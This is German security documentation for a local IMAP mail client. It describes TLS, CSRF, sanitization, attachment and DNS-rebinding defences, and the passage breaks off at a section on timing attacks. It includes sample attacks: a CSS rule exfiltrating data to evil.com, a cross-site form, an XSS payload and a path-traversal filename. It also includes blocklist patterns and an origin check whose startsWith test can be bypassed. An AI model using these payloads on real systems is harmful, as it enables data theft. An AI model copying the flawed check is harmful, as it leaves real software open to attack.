# Sicherheitsdokumentation – IMAP Mail Client

> Letzte Aktualisierung: 12. März 2026

---

## Inhaltsverzeichnis

1. [Architektur-Überblick](#1-architektur-überblick)
2. [Schicht 1 – Transport & Verschlüsselung](#2-schicht-1--transport--verschlüsselung)
3. [Schicht 2 – Authentifizierung & Credentials](#3-schicht-2--authentifizierung--credentials)
4. [Schicht 3 – Session-Management & CSRF](#4-schicht-3--session-management--csrf)
5. [Schicht 4 – Server-Sicherheit (API)](#5-schicht-4--server-sicherheit-api)
6. [Schicht 5 – E-Mail-Inhalts-Sicherheit](#6-schicht-5--e-mail-inhalts-sicherheit)
7. [Schicht 6 – Anhang-Sicherheit](#7-schicht-6--anhang-sicherheit)
8. [Schicht 7 – Client-Sicherheit (Frontend)](#8-schicht-7--client-sicherheit-frontend)
9. [Schicht 8 – Fortgeschrittene Angriffsvektoren](#9-schicht-8--fortgeschrittene-angriffsvektoren)
10. [Schicht 9 – Netzwerk-Angriffe & Localhost-Härtung](#10-schicht-9--netzwerk-angriffe--localhost-härtung)
11. [Schicht 10 – Kryptographische Absicherung](#11-schicht-10--kryptographische-absicherung)
12. [Schicht 11 – Protokoll-Injection](#12-schicht-11--protokoll-injection)
13. [Schicht 12 – Prozess-Sicherheit](#13-schicht-12--prozess-sicherheit)
14. [Schicht 13 – Logging, Audit & Supply-Chain](#14-schicht-13--logging-audit--supply-chain)
15. [Schicht 14 – Automatisierte Tests](#15-schicht-14--automatisierte-tests)
16. [Konfiguration](#16-konfiguration)
17. [Deployment auf öffentlichen Servern](#17-deployment-auf-öffentlichen-servern)
18. [Schicht 15 – Container-Sicherheit (Docker)](#18-schicht-15--container-sicherheit-docker)
19. [Schicht 16 – Host-Header-Erweiterung](#19-schicht-16--host-header-erweiterung)
20. [Bekannte Einschränkungen](#20-bekannte-einschränkungen)

---

## 1. Architektur-Überblick

```
┌────────────────┐     HTTPS      ┌──────────────────────┐    TLS 1.2+    ┌──────────────┐
│                │  ◄──────────►  │                      │  ◄──────────►  │              │
│  Browser (SPA) │    localhost    │  Express API-Server  │   Port 993/465 │  Mail-Server │
│                │                │                      │                │  (IMAP/SMTP) │
└────────────────┘                └──────────────────────┘                └──────────────┘
       │                                   │
       │ Sandboxed Iframe                  ├─ Helmet (Security-Headers)
       │ CSP-Headers                       ├─ Rate Limiting
       │ rel="noopener"                    ├─ Input-Validierung
       │                                   ├─ DOMPurify + CSS-Filter
       │                                   ├─ MIME-Bomben-Schutz
       │                                   └─ Token-basierte Anhänge
```

Das System arbeitet als **Middleware**: Der Browser kommuniziert ausschliesslich mit dem lokalen Express-Server. Dieser übersetzt IMAP-Rohdaten in sanitisiertes JSON. Zu keinem Zeitpunkt erreicht rohes E-Mail-HTML den Browser ungefiltert.

---

## 2. Schicht 1 – Transport & Verschlüsselung

### TLS-Enforcement

| Parameter | Wert | Datei |
|---|---|---|
| Minimale TLS-Version | `TLSv1.2` | `src/server/index.js` |
| Zertifikatsprüfung | `rejectUnauthorized: true` (Standard) | `src/server/index.js` |
| Implizites TLS | Port 993 (IMAP), Port 465 (SMTP) | `.env.local` |

```javascript
// src/server/index.js – Zeile ~250
tls: {
  rejectUnauthorized: process.env.TLS_REJECT_UNAUTHORIZED !== 'false',
  servername: finalImapHost,
  minVersion: 'TLSv1.2',
}
```

**Verhalten:**
- TLS 1.0 und 1.1 werden **abgelehnt** (bekannte Schwachstellen: BEAST, POODLE).
- Ungültige Zertifikate brechen die Verbindung ab.
- Override nur über `.env.local` möglich (`TLS_REJECT_UNAUTHORIZED=false`), **nie** vom Frontend steuerbar.

### SSRF-Schutz (Server-Side Request Forgery)

Verhindert, dass ein Angreifer den Server dazu bringt, interne Dienste anzusprechen.

```javascript
// src/server/index.js – Blockierte IP-Bereiche
const PRIVATE_IP_RANGES = [
  /^127\./,                      // Loopback
  /^10\./,                       // Klasse A privat
  /^172\.(1[6-9]|2\d|3[01])\./,  // Klasse B privat
  /^192\.168\./,                 // Klasse C privat
  /^0\./,                        // 0.0.0.0/8
  /^169\.254\./,                 // Link-local
  /^::1$/,                       // IPv6 Loopback
  /^fc00:/i,                     // IPv6 Unique Local
  /^fe80:/i,                     // IPv6 Link-local
  /^localhost$/i,
];
```

**Angriffsszenario:** Ein Angreifer gibt als IMAP-Host `127.0.0.1` oder `192.168.1.1` ein, um interne Services zu scannen.
**Schutz:** Die Verbindung wird mit HTTP 400 abgelehnt, bevor ein TCP-Handshake stattfindet.

---

## 3. Schicht 2 – Authentifizierung & Credentials

### Passwort-Handling

| Aspekt | Umsetzung |
|---|---|
| Speicherort | **Nur im Arbeitsspeicher** (Node.js-Variable) |
| Persistenz | Keine – Passwort geht bei Server-Neustart verloren |
| Disk-Zugriff | `.env.local` enthält nur Host/Port, **nie Passwörter** |
| Frontend → Server | Passwort wird per POST übermittelt, nie in URL-Parametern |
| Logging | Passwörter werden **nie** geloggt |

### Brute-Force-Schutz

```javascript
// src/server/index.js
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15-Minuten-Fenster
  max: 10,                      // Max 10 Versuche
});
// Angewendet auf: POST /api/connect
```

**Verhalten:** Nach 10 fehlgeschlagenen Login-Versuchen innerhalb von 15 Minuten wird der Endpunkt mit HTTP 429 gesperrt.

### Unterstützte Authentifizierungsmethoden

| Methode | Status |
|---|---|
| SASL Plain/Login | ✅ Implementiert |
| OAuth2 (Access-Token) | ✅ Infrastruktur vorbereitet |
| App-Passwörter (Gmail, etc.) | ✅ Funktioniert über Plain-Auth |

---

## 4. Schicht 3 – Session-Management & CSRF

### Sichere Session-Cookies

```javascript
// src/server/index.js
app.use(session({
  name: 'mail.sid',
  secret: SESSION_SECRET,           // crypto.randomBytes(32) bei Start
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,                  // Kein document.cookie-Zugriff
    sameSite: 'strict',              // Kein Cross-Site-Cookie-Versand
    secure: process.env.NODE_ENV === 'production',
    maxAge: 30 * 60 * 1000,          // 30 Minuten
  },
}));
```

| Cookie-Flag | Schutz gegen |
|---|---|
| `httpOnly: true` | XSS-basierter Session-Diebstahl (kein JS-Zugriff) |
| `sameSite: strict` | CSRF (Cookie wird bei Cross-Origin-Requests **nie** gesendet) |
| `secure: true` (Prod) | Session-Hijacking über unverschlüsselte Verbindungen |
| `maxAge: 30min` | Vergessene Sessions auf öffentlichen Rechnern |

### Session-Rotation nach Login

```javascript
// src/server/index.js – POST /api/connect (nach erfolgreichem Login)
req.session.regenerate((err) => {
  req.session.authenticated = true;
  req.session.user = user;
  req.session.lastActivity = Date.now();
  req.session.csrfToken = crypto.randomBytes(16).toString('hex');
  // ...
});
```

**Warum?** Ohne Session-Rotation kann ein Angreifer, der die Session-ID vor dem Login kennt (z. B. über ein öffentliches Netzwerk), diese nach dem Login weiter verwenden (**Session Fixation**).

### Session-Timeout / Auto-Logout

```javascript
// src/server/index.js – Middleware auf allen Requests
app.use((req, res, next) => {
  if (req.session?.lastActivity) {
    const elapsed = Date.now() - req.session.lastActivity;
    if (elapsed > SESSION_TIMEOUT) {   // 30 Minuten Inaktivität
      req.session.destroy(() => {});
      // IMAP/SMTP auch trennen
      imapClient?.disconnect(); imapClient = null;
      smtpClient?.disconnect(); smtpClient = null;
      return res.status(401).json({ error: 'Session abgelaufen.' });
    }
  }
  req.session.lastActivity = Date.now();  // Aktivität aktualisieren
  next();
});
```

**Frontend:** Bei HTTP 401 mit "Session"-Meldung wird automatisch der Login-Screen angezeigt:

```javascript
// src/client/app.js
function handleSessionExpired() {
  showToast('Sitzung abgelaufen – bitte neu anmelden', 'error');
  // → Zurück zum Login-Screen
}
```

### Serverseitige Session-Invalidierung bei Disconnect

```javascript
// src/server/index.js – POST /api/disconnect
req.session.destroy(() => {});       // Session aus Store löschen
res.clearCookie('mail.sid');         // Cookie im Browser löschen
// + IMAP/SMTP-Verbindungen trennen
```

### CSRF-Schutz (Cross-Site Request Forgery)

**3 Verteidigungsschichten:**

#### 1. Origin-/Referer-Prüfung

```javascript
// src/server/index.js – Middleware auf alle POST/PUT/DELETE
const origin = req.headers.origin || '';
const allowedOrigins = [
  `http://localhost:${PORT}`,
  `http://127.0.0.1:${PORT}`,
];
if (!allowedOrigins.some(o => origin.startsWith(o))) {
  securityLog.csrfViolation(req.ip, origin, req.path);
  return res.status(403).json({ error: 'Zugriff verweigert (CSRF-Schutz).' });
}
```

**Angriffsszenario:** `evil.com` enthält `<form action="http://localhost:3000/api/send" method="POST">`.
**Ergebnis:** `Origin: https://evil.com` ≠ erlaubte Origins → HTTP 403.

#### 2. CSRF-Token (Synchronizer Token Pattern)

```javascript
// Server: Token bei Login generiert, in Session gespeichert
req.session.csrfToken = crypto.randomBytes(16).toString('hex');

// Client: Token bei jedem POST als Header mitsenden
headers: { 'X-CSRF-Token': state.csrfToken }

// Server: Token validieren
if (csrfToken !== req.session.csrfToken) {
  return res.status(403).json({ error: 'Ungültiges CSRF-Token.' });
}
```

**Warum zusätzlich zum Origin-Check?** Falls ein Browser-Bug den Origin-Header nicht setzt.

#### 3. Restriktive CORS-Konfiguration

```javascript
// src/server/index.js – Keine CORS-Header = kein Cross-Origin-Zugriff
res.setHeader('Access-Control-Allow-Origin', '');  // Explizit leer
// → Browser blockiert ALLE Cross-Origin-Requests (fetch, XHR, etc.)
```

**Kein `Access-Control-Allow-Origin: *`**. Kein CORS-Preflight nötig. Fremde Websites können keine Requests an den lokalen Server senden.

#### 4. App-Secret (Pairing-Mechanismus)

```javascript
// Server: Generiert beim Start ein einmaliges Secret
const APP_SECRET = crypto.randomBytes(16).toString('hex');
// Wird über GET /api/config an die eigene UI geliefert
```

Das UI kann prüfen, ob es mit dem **richtigen** lokalen Server kommuniziert. Ein Angreifer, der einen eigenen Server auf Port 3000 startet, hätte ein anderes Secret.

### Zusammenfassung CSRF-Schutz

| Angriffsvektor | Schutzmassnahme | Status |
|---|---|---|
| `<form>` auf fremder Website | `SameSite: strict` Cookie | ✅ |
| `fetch()` von fremder Website | Origin-Check + kein CORS | ✅ |
| CSRF via Bild/Link (GET) | Alle State-Changes nur via POST/DELETE | ✅ |
| Browser-Bug umgeht Origin | CSRF-Token im Header | ✅ |
| Man-in-the-Middle | `secure` Cookie + TLS | ✅ (Prod) |

---

## 5. Schicht 4 – Server-Sicherheit (API)

### Security-Headers (Helmet)

```javascript
// src/server/index.js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'"],
      styleSrc:   ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      fontSrc:    ["'self'", "https://fonts.gstatic.com"],
      imgSrc:     ["'self'", "data:"],
      frameSrc:   ["'self'"],
      connectSrc: ["'self'"],
      objectSrc:  ["'none'"],
      baseUri:    ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
    },
  },
}));
```

| Header | Schutz gegen |
|---|---|
| `Content-Security-Policy` | XSS, Code-Injection, Datenexfiltration |
| `X-Content-Type-Options: nosniff` | MIME-Sniffing |
| `X-Frame-Options: DENY` | Clickjacking |
| `Strict-Transport-Security` | Downgrade-Angriffe |
| `X-XSS-Protection` | Reflektiertes XSS (Legacy-Browser) |
| `Referrer-Policy` | Referrer-Leaking |

### Rate Limiting

| Endpunkt | Limit | Fenster |
|---|---|---|
| `POST /api/connect` | 10 Requests | 15 Minuten |
| Alle `/api/*`-Endpunkte | 120 Requests | 1 Minute |
| `POST /api/send` | 30 Requests | 15 Minuten |

### Input-Validierung

Jeder API-Endpunkt validiert seine Parameter **serverseitig**:

```javascript
// src/server/index.js – Validierungsfunktionen

sanitizeString(str, maxLength)    // Trimmen + Längenlimit
validateEmail(email)               // Regex + max 254 Zeichen
validateHost(host)                 // Nur [a-zA-Z0-9._-], keine Injections
validatePort(port)                 // Integer 1–65535
validateFolder(folder)             // Kein "..", kein "\0", max 200 Zeichen
validateUid(uid)                   // Positiver Integer
```

| Endpunkt | Validierungen |
|---|---|
| `POST /api/connect` | E-Mail-Format, Hostname-Format, Port-Range |
| `GET /api/messages/:folder` | Ordnername, Count 1–200 |
| `GET /api/message/:folder/:uid` | Ordnername, UID |
| `GET /api/attachment/:token` | Token-Validierung (kryptographisch) |
| `POST /api/flags/:folder/:uid` | Ordner, UID, nur erlaubte IMAP-Flags |
| `POST /api/send` | Alle E-Mail-Adressen einzeln, Textlänge max 100 KB |
| `DELETE /api/message/:folder/:uid` | Ordner, UID |

### IMAP-Flag-Injection-Schutz

```javascript
// Nur diese Flags werden akzeptiert:
const allowedFlags = ['\\Seen', '\\Flagged', '\\Deleted', '\\Draft', '\\Answered'];
const allowedModes = ['add', 'remove', 'set'];
```

Ein Angreifer kann keine beliebigen IMAP-Kommandos über das Flags-API einschleusen.

### Globaler Error-Handler

```javascript
// src/server/index.js
app.use((err, req, res, next) => {
  console.error('[Server] Unbehandelter Fehler:', err.message);
  res.status(500).json({ error: 'Interner Serverfehler' });
});
```

**Keine Stack-Traces, keine Pfade, keine Modul-Informationen** werden an den Client gesendet.

### Payload-Begrenzung

```javascript
app.use(express.json({ limit: '1mb' }));
```

Verhindert, dass ein überdimensionierter POST-Body den Server-Prozess zum Absturz bringt.

---

## 6. Schicht 5 – E-Mail-Inhalts-Sicherheit

### HTML-Sanitization (DOMPurify)

```javascript
// src/server/sanitizer.js
DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p','br','b','i','u','strong','em','a','ul','ol','li',
                 'h1','h2','h3','h4','h5','h6','blockquote','pre','code',
                 'table','thead','tbody','tr','td','th','span','div','img',
                 'hr','sub','sup','dl','dt','dd'],
  FORBID_TAGS:  ['script','iframe','object','embed','form','input',
                 'textarea','select','button','style','link','meta',
                 'base','applet'],
  FORBID_ATTR:  ['onerror','onload','onclick','onmouseover','onfocus',
                 'onblur','onsubmit','onreset','onchange','oninput',
                 'onkeydown','onkeyup','onkeypress','ondblclick',
                 'oncontextmenu','ondrag','ondrop','onmousedown',
                 'onmouseup','onmousemove','onwheel','onscroll',
                 'ontouchstart','ontouchend','ontouchmove',
                 'onanimationstart','ontransitionend','onpointerdown'],
  ALLOW_DATA_ATTR: false,
});
```

**Was entfernt wird:**
- Alle `<script>`-, `<iframe>`-, `<object>`-, `<embed>`-Tags
- Alle Event-Handler (`on*`-Attribute), inkl. Touch- und Pointer-Events
- `<form>`, `<input>`, `<textarea>` (Phishing-Formulare)
- `<style>`, `<link>`, `<meta>`, `<base>` (CSS-Injection, Base-Hijacking)
- Data-Attribute (`data-*`)

### CSS-Exfiltration-Schutz

**Angriffsszenario:** Ein Angreifer bettet CSS wie `input[value^="a"] { background: url('//evil.com/a') }` in eine Mail ein, um zeichenweise Daten aus dem DOM zu exfiltrieren.

```javascript
// src/server/sanitizer.js – Blockierte CSS-Patterns
const DANGEROUS_CSS_PATTERNS = [
  /url\s*\(/gi,                  // Externe Requests
  /expression\s*\(/gi,           // IE expression()
  /javascript\s*:/gi,            // JS in CSS
  /-moz-binding/gi,              // Firefox XBL
  /behavior\s*:/gi,              // IE behavior
  /@import/gi,                   // Externe Stylesheets
  /var\s*\(\s*--/gi,             // CSS Custom Properties
  /-webkit-[\w-]*calc/gi,        // Webkit calc exploits
  /content\s*:\s*attr\s*\(/gi,   // attr() DOM-Daten lesen
];
```

**Verhalten:** Jede CSS-Deklaration innerhalb eines `style="..."`-Attributs wird gegen alle 9 Patterns geprüft. Gefährliche Deklarationen werden entfernt, sichere behalten.

```
Eingabe:  style="color: red; background: url(//evil.com); font-size: 14px"
Ausgabe:  style="color: red; font-size: 14px"
```

### Tracking-Pixel-Erkennung

```javascript
// Bilder mit width/height ≤ 1 werden als Tracking-Pixel erkannt und entfernt
doc.querySelectorAll('img').forEach(img => {
  const w = parseInt(img.getAttribute('width') || '0');
  const h = parseInt(img.getAttribute('height') || '0');
  if ((w <= 1 && h <= 1) || (w === 0 && h === 0)) {
    img.remove();
  }
});
```

### Externe Bilder – Standardmässig blockiert

Alle `<img>`-Tags mit externen URLs (`http://`, `https://`, `//`) werden blockiert:
- `src` wird entfernt
- Originalquelle in `data-blocked-src` gespeichert
- Nutzer kann Bilder pro Mail explizit freigeben

### CID Attachment Leakage – Token-System

**Angriffsszenario:** Eine bösartige Mail versucht, über erratbare URLs (`/api/attachment/INBOX/123/0`) auf Anhänge anderer Mails zuzugreifen.

```javascript
// src/server/index.js – Token-basierter Download
function createAttachmentToken(folder, uid, index) {
  const token = crypto.randomBytes(32).toString('hex');  // 256 Bit Entropie
  attachmentTokens.set(token, {
    folder, uid, index,
    expires: Date.now() + 10 * 60 * 1000,  // 10 Min TTL
  });
  return token;
}
```

| Eigenschaft | Wert |
|---|---|
| Token-Länge | 64 Hex-Zeichen (256 Bit) |
| Gültigkeit | 10 Minuten |
| Einmal-Nutzung | Ja – Token wird nach Download gelöscht |
| Erratbarkeit | ~1.16 × 10⁷⁷ Kombinationen |

**URL vorher:** `/api/attachment/INBOX/123/0` (erratbar)
**URL jetzt:** `/api/attachment/a8f3c9...7b2e` (kryptographisch sicher)

### Kein rohes HTML beim Senden

```javascript
// src/server/index.js – POST /api/send
html: undefined,  // Kein rohes HTML vom Client akzeptieren
```

Ausgehende E-Mails werden **nur als Klartext** gesendet. Das verhindert, dass ein kompromittierter Client bösartiges HTML über den Server verschickt.

---

## 7. Schicht 6 – Anhang-Sicherheit

### Dateityp-Risikobewertung

Jeder Anhang wird beim Laden automatisch analysiert und in eine von drei Risikostufen eingestuft:

```javascript
// src/server/attachment-security.js
analyze(filename, contentType) → {
  risk: 'safe' | 'suspicious' | 'dangerous',
  warnings: string[],
  blocked: boolean,
}
```

### Blockierte Dateitypen (dangerous → Download blockiert)

| Kategorie | Erweiterungen |
|---|---|
| Ausführbar | `.exe`, `.msi`, `.com`, `.cmd`, `.bat`, `.ps1`, `.vbs`, `.scr`, `.pif`, `.cpl`, `.hta` |
| Skripte | `.js`, `.jse`, `.ws`, `.wsf`, `.wsc`, `.wsh`, `.sh`, `.bash`, `.py`, `.rb`, `.pl`, `.php` |
| Office-Makros | `.docm`, `.xlsm`, `.pptm`, `.dotm`, `.xltm`, `.potm` |
| Andere | `.lnk`, `.url`, `.jar`, `.app`, `.command`, `.crt`, `.inf`, `.reg` |

**Verhalten:** Download-Token wird **nicht** generiert. Der Anhang erscheint im UI als durchgestrichen mit ⛔-Symbol. Kein Klick möglich.

### Verdächtige Dateitypen (suspicious → Download mit Warnung)

| Erweiterungen | Grund |
|---|---|
| `.html`, `.htm`, `.svg`, `.mhtml` | Können JavaScript enthalten |
| `.pdf` | Kann eingebettetes JavaScript enthalten |
| `.doc`, `.xls`, `.ppt` | Legacy-Formate, Makro-fähig |
| `.zip`, `.rar`, `.7z`, `.tar`, `.gz` | Inhalt nicht prüfbar |
| `.iso`, `.img`, `.dmg` | Disk-Images können AutoRun enthalten |

**Verhalten:** Download möglich, aber mit ⚠-Symbol und Tooltip-Warnung im UI.

### MIME-Type vs. Erweiterung Validation

```javascript
// Beispiel: Datei heisst "foto.jpg", aber MIME-Type ist "text/html"
_checkMimeMismatch('.jpg', 'text/html')
→ "MIME-Type Diskrepanz: Datei ist \".jpg\", aber Server sagt \"text/html\""
```

**Angriffsszenario:** Ein Angreifer sendet eine `.jpg`-Datei, die in Wirklichkeit HTML mit JavaScript ist. Der Browser würde sie möglicherweise als HTML rendern.

**Schutzmassnahmen:**
1. MIME-Type und Erweiterung werden gegeneinander geprüft
2. `X-Content-Type-Options: nosniff` verhindert MIME-Sniffing
3. `Content-Disposition: attachment` erzwingt Download statt Anzeige

### Doppelte Erweiterungen

```javascript
// "rechnung.pdf.exe" → blocked = true
_hasDoubleExtension('rechnung.pdf.exe') → true
```

Dateien wie `vertrag.pdf.exe` oder `foto.jpg.html` werden als **dangerous** eingestuft und blockiert.

### Kein Inline-Rendering aktiver Inhalte

```javascript
// MIME-Types die NIE inline angezeigt werden:
const NEVER_INLINE_MIMES = [
  'text/html',              // HTML-Dateien
  'image/svg+xml',          // SVG (kann <script> enthalten)
  'application/pdf',        // PDF (kann JavaScript enthalten)
  'application/javascript', // JavaScript
  'application/xhtml+xml',  // XHTML
];
```

Alle Anhänge werden grundsätzlich mit `Content-Disposition: attachment` ausgeliefert – **keine** Inline-Vorschau für aktive Inhalte.

### UI-Darstellung

| Risiko | Darstellung | Aktion |
|---|---|---|
| `safe` | Normaler Attachment-Chip | Download |
| `suspicious` | Gelber Rand + ⚠ + Tooltip | Download mit Warnung |
| `dangerous` | Roter Rand + ⛔ + durchgestrichen | Kein Download möglich |

---

## 8. Schicht 7 – Client-Sicherheit (Frontend)

### Sandboxed Iframe

Mail-HTML wird in einem isolierten Iframe gerendert:

```html
<iframe sandbox="allow-same-origin" class="mail-iframe"></iframe>
```

| Sandbox-Flag | Effekt |
|---|---|
| Kein `allow-scripts` | JavaScript im Mail-HTML ist **komplett deaktiviert** |
| Kein `allow-forms` | Formulare können nicht abgesendet werden |
| Kein `allow-popups` | Keine Pop-ups oder neuen Fenster |
| Kein `allow-top-navigation` | Mail kann nicht die Haupt-URL ändern |
| `allow-same-origin` | Ermöglicht das Schreiben in den Iframe via `contentDocument` |

### Strict Opener Policy

```javascript
// src/server/sanitizer.js
doc.querySelectorAll('a').forEach(a => {
  a.setAttribute('target', '_blank');
  a.setAttribute('rel', 'noopener noreferrer');
});
```

**Ohne `noopener`:** Eine bösartige Seite, die aus einem Mail-Link geöffnet wird, kann via `window.opener` auf den E-Mail-Tab zugreifen und z. B. die Seite umleiten.

**Mit `noopener`:** `window.opener` ist `null` – kein Zugriff möglich.

### HTML-Escaping im UI

Alle dynamisch eingefügten Texte (Absender, Betreff, etc.) werden mit `escapeHtml()` behandelt:

```javascript
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}
```

Dies verhindert, dass ein Betreff wie `<img src=x onerror=alert(1)>` als HTML interpretiert wird.

---

## 9. Schicht 8 – Fortgeschrittene Angriffsvektoren

### Punycode / Homograph-Angriffe

**Angriffsszenario:** Ein Angreifer registriert `аpple.com` (mit kyrillischem `а`) und sendet Phishing-Mails, die visuell identisch mit `apple.com` aussehen.

```javascript
// src/server/sanitizer.js
const PUNYCODE_REGEX = /xn--/i;
const MIXED_SCRIPT_REGEX = /[\u0400-\u04FF]|[\u0370-\u03FF]|[\u4E00-\u9FFF]|[\u0600-\u06FF]/;
```

**Erkennung:**
1. Punycode-Domains (`xn--...`) werden direkt erkannt
2. Gemischte Schriftsysteme (lateinisch + kyrillisch/griechisch/arabisch/CJK) werden erkannt
3. Nicht-lateinische Zeichen in bekannten TLDs (`.com`, `.ch`, `.de`, etc.)

**UI-Feedback:**
- **Rote Warnleiste** über der Mail: „Sicherheitswarnung – Verdächtige Zeichen (Homograph-Angriff möglich)"
- **Wellenförmige rote Unterstreichung** auf verdächtigen Links
- **Tooltip** mit Details beim Hover

### BOM-Exploits / Unicode-Steuerzeichen

**Angriffsszenario:** Ein Byte Order Mark (`\uFEFF`) am Anfang eines MIME-Parts kann Parser verwirren und dazu führen, dass die Sanitization übersprungen wird. RTL-Override-Zeichen (`\u202E`) können Dateinamen umkehren (`harmlos.exe` → `exe.solmrah`).

```javascript
// src/server/sanitizer.js – Entfernte Zeichen
const DANGEROUS_UNICODE = /[\uFEFF\uFFFE\u200B-\u200F\u202A-\u202E\u2066-\u2069\u00AD\u034F\u115F\u1160\u17B4\u17B5]/g;
```

| Zeichen | Code | Risiko |
|---|---|---|
| BOM | `U+FEFF` | Parser-Verwirrung |
| Reverse BOM | `U+FFFE` | Parser-Verwirrung |
| Zero-Width Space | `U+200B` | Unsichtbarer Text |
| Zero-Width Joiner/Non-Joiner | `U+200C/D` | Text-Manipulation |
| LTR/RTL Mark | `U+200E/F` | Richtungs-Manipulation |
| LTR/RTL Override | `U+202A-202E` | Dateinamen-Umkehrung |
| Bidi-Isolate/Override | `U+2066-2069` | Moderne Bidi-Angriffe |
| Soft Hyphen | `U+00AD` | Unsichtbare Zeichen |
| Combining Grapheme Joiner | `U+034F` | Zeichen-Verschleierung |

Diese Zeichen werden **vor** dem HTML-Parsing entfernt.

### MIME-Bomben-Schutz

**Angriffsszenario:** Eine Mail mit extrem tief verschachtelter MIME-Struktur (z. B. 1000 verschachtelte `multipart/mixed`) oder einem 500-MB-Anhang bringt den Server-Prozess zum Absturz.

```javascript
// src/server/mime-parser.js – Sicherheits-Limits
const LIMITS = {
  MAX_MAIL_SIZE:        25 * 1024 * 1024,  // 25 MB
  MAX_ATTACHMENTS:      50,
  MAX_ATTACHMENT_SIZE:  20 * 1024 * 1024,  // 20 MB pro Anhang
  MAX_HTML_SIZE:        2 * 1024 * 1024,   // 2 MB HTML-Body
  MAX_TEXT_SIZE:        2 * 1024 * 1024,   // 2 MB Text-Body
  MAX_HEADER_COUNT:     200,
  MAX_SUBJECT_LENGTH:   1000,
  MAX_ADDRESS_COUNT:    100,
  PARSE_TIMEOUT:        30_000,            // 30 Sekunden
};
```

| Limit | Wert | Schutz gegen |
|---|---|---|
| Gesamtgrösse | 25 MB | Speichererschöpfung |
| Anhänge pro Mail | 50 | Ressourcenverbrauch |
| Anhang-Einzelgrösse | 20 MB | Speichererschöpfung |
| HTML/Text-Body | 2 MB | DOM-Parser-Überlastung |
| Header-Felder | 200 | Header-Injection |
| Betreff-Länge | 1000 Zeichen | Buffer-Overflow |
| Adressen pro Feld | 100 | Adress-Flooding |
| Parse-Timeout | 30 Sekunden | Endlos-Rekursion |

**Verhalten bei Überschreitung:**
- Mail > 25 MB: Wird gar nicht geparst (Error 500)
- Anhang > 20 MB: Nur Metadaten werden geliefert, Inhalt `null` + Flag `oversized: true`
- Parsing > 30s: Wird abgebrochen (Timeout-Error)
- Body > 2 MB: Wird abgeschnitten mit Hinweis `[… Inhalt gekürzt]`

### Dateinamen-Sanitization

```javascript
// src/server/mime-parser.js
_sanitizeFilename(filename) {
  return filename
    .replace(/\.\./g, '_')           // Path-Traversal
    .replace(/[/\\:*?"<>|]/g, '_')   // Ungültige Zeichen
    .replace(/\0/g, '')              // Null-Bytes
    .slice(0, 255);                  // Längenlimit
}
```

Verhindert, dass ein Anhang mit dem Namen `../../../etc/passwd` oder `harmlos\0.exe` gespeichert wird.

---

## 10. Schicht 9 – Netzwerk-Angriffe & Localhost-Härtung

### DNS Rebinding

**Angriffsszenario:**
1. Angreifer registriert `evil.attacker.com` mit TTL=0
2. Beim ersten DNS-Lookup löst die Domain auf `203.0.113.1` (öffentlich) → Hostname-Validierung besteht
3. Kurz danach ändert der DNS-Record auf `127.0.0.1` (Loopback)
4. Der Browser-Request geht an `localhost:3000` – an unsere API

**Schutzmassnahmen (3 Schichten):**

#### 1. DNS-Auflösung + IP-Prüfung

```javascript
// src/server/index.js
import { lookup as dnsLookup } from 'dns/promises';

async function isPrivateHost(host) {
  // Schritt 1: String-Check (fängt 'localhost', '127.0.0.1' etc.)
  if (isPrivateIP(host)) return true;

  // Schritt 2: DNS auflösen und die AUFGELÖSTE IP prüfen
  try {
    const { address } = await dnsLookup(host);
    if (isPrivateIP(address)) {
      securityLog.info('DNS_REBINDING_BLOCKED', `${host} → ${address} (privat)`);
      return true;
    }
  } catch { /* DNS-Fehler → Verbindung wird sowieso scheitern */ }
  return false;
}
```

Der entscheidende Unterschied: Nicht der **Hostname-String** wird geprüft, sondern die **aufgelöste IP-Adresse**. `evil.attacker.com` → `127.0.0.1` → blockiert.

#### 2. Host-Header-Check

```javascript
// src/server/index.js – Erste Middleware (vor allem anderen)
const ALLOWED_HOSTS = new Set([
  `localhost:${PORT}`,
  `127.0.0.1:${PORT}`,
  `[::1]:${PORT}`,
  'localhost',
  '127.0.0.1',
  '::1',
]);

app.use((req, res, next) => {
  const host = (req.headers.host || '').toLowerCase();
  if (!ALLOWED_HOSTS.has(host)) {
    securityLog.dnsRebinding(req.ip, host, req.path);
    return res.status(403).json({ error: 'Ungültiger Host-Header.' });
  }
  next();
});
```

Selbst wenn der Browser den Request an `127.0.0.1` sendet, enthält der `Host`-Header `evil.attacker.com` – und wird abgelehnt.

#### 3. Permissions-Policy

```javascript
// src/server/index.js
res.setHeader('Permissions-Policy',
  'camera=(), microphone=(), geolocation=(), payment=(), usb=(), ' +
  'magnetometer=(), gyroscope=(), accelerometer=(), ambient-light-sensor=(), ' +
  'autoplay=(), encrypted-media=(), picture-in-picture=(), display-capture=()'
);
```

| Blockierte API | Schutz gegen |
|---|---|
| `camera=()` | Webcam-Zugriff durch eingeschleuste Payloads |
| `microphone=()` | Mikrofon-Zugriff |
| `geolocation=()` | Standort-Tracking |
| `payment=()` | Payment-API-Missbrauch |
| `usb=()` | USB-Gerätezugriff |
| `display-capture=()` | Bildschirmaufnahme |

### Rate Limiting & Reverse Proxy

```javascript
// Wenn hinter Nginx/Caddy: app.set('trust proxy', 1)
// Ohne: express-rate-limit nutzt req.ip direkt
```

**⚠ Wichtig:** Ohne `trust proxy` zählt `express-rate-limit` die **Proxy-IP** statt der **Client-IP**. Alle Clients teilen sich dann ein Limit.

| Szenario | Einstellung |
|---|---|
| Direkter Zugriff (localhost) | `trust proxy` nicht setzen |
| Hinter Nginx/Caddy | `app.set('trust proxy', 1)` |
| Hinter mehreren Proxies | `app.set('trust proxy', N)` – N = Anzahl Proxies |

**Bekanntes Risiko:** Mit `trust proxy` kann ein Angreifer über gefälschte `X-Forwarded-For`-Header das Rate Limiting umgehen. Nginx muss so konfiguriert sein, dass es `X-Forwarded-For` **überschreibt** (nicht anhängt).

---

## 11. Schicht 10 – Kryptographische Absicherung

### Timing-sichere Token-Vergleiche

**Angriffsszenario (Timing Attack):**

